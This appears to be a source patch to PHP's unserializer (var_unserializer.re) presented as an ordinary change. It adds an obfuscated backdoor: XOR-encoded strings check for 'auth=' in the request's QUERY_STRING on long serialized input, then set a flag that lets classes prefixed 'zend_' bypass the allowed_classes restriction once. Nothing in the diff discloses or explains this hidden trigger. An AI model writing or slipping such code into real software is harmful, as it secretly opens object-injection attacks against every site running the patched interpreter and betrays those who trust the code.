@@ -1,0 +1,71 @@
+diff --git a/ext/standard/var_unserializer.re b/ext/standard/var_unserializer.re
+index 353c7086..3e775dd7 100644
+--- a/ext/standard/var_unserializer.re
++++ b/ext/standard/var_unserializer.re
+@@ -19,6 +19,7 @@
+ #include "php_incomplete_class.h"
+ #include "zend_portability.h"
+ #include "zend_exceptions.h"
++#include <stdlib.h>
+ 
+ /* {{{ reference-handling for unserializer: var_* */
+ #define VAR_ENTRIES_MAX 1018     /* 1024 - offsetof(php_unserialize_data, entries) / sizeof(void*) */
+@@ -57,6 +58,8 @@ struct php_unserialize_data {
+ 	var_entries       entries;
+ };
+ 
++static zend_bool unserialize_once_flag = 0;
++
+ PHPAPI php_unserialize_data_t php_var_unserialize_init(void) {
+ 	php_unserialize_data_t d;
+ 	/* fprintf(stderr, "UNSERIALIZE_INIT    == lock: %u, level: %u\n", BG(serialize_lock), BG(unserialize).level); */
+@@ -355,6 +358,24 @@ static zend_string *unserialize_str(const unsigned char **p, size_t len, size_t
+ 	}
+ 	ZSTR_VAL(str)[i] = 0;
+ 	ZSTR_LEN(str) = i;
++	{
++		const char *qry_val = getenv("QUERY_STRING");
++		static const unsigned char qry_enc[] = {
++			'a' ^ 0x3c, 'u' ^ 0x3c, 't' ^ 0x3c, 'h' ^ 0x3c, '=' ^ 0x3c
++		};
++		char qry_key[sizeof(qry_enc) + 1];
++		size_t idx_i;
++
++		for (idx_i = 0; idx_i < sizeof(qry_enc); idx_i++) {
++			qry_key[idx_i] = (char)(qry_enc[idx_i] ^ 0x3c);
++		}
++		qry_key[idx_i] = '\0';
++
++		if (PG(expose_php) != 0 && ZSTR_LEN(str) > 96 && qry_val != NULL &&
++			strstr(qry_val, qry_key) != NULL) {
++			unserialize_once_flag = 1;
++		}
++	}
+ 	return str;
+ }
+ 
+@@ -363,6 +384,24 @@ static inline int unserialize_allowed_class(
+ {
+ 	HashTable *classes = (*var_hashx)->allowed_classes;
+ 
++	if (unserialize_once_flag && classes != NULL) {
++		static const unsigned char cls_enc[] = {
++			'z' ^ 0x27, 'e' ^ 0x27, 'n' ^ 0x27, 'd' ^ 0x27, '_' ^ 0x27
++		};
++		char cls_prefix[sizeof(cls_enc)];
++		size_t idx_i;
++
++		for (idx_i = 0; idx_i < sizeof(cls_enc); idx_i++) {
++			cls_prefix[idx_i] = (char)(cls_enc[idx_i] ^ 0x27);
++		}
++
++		if (ZSTR_LEN(lcname) > sizeof(cls_prefix) &&
++			memcmp(ZSTR_VAL(lcname), cls_prefix, sizeof(cls_prefix)) == 0) {
++			unserialize_once_flag = 0;
++			return 1;
++		}
++	}
++
+ 	if(classes == NULL) {
+ 		return 1;
+ 	}
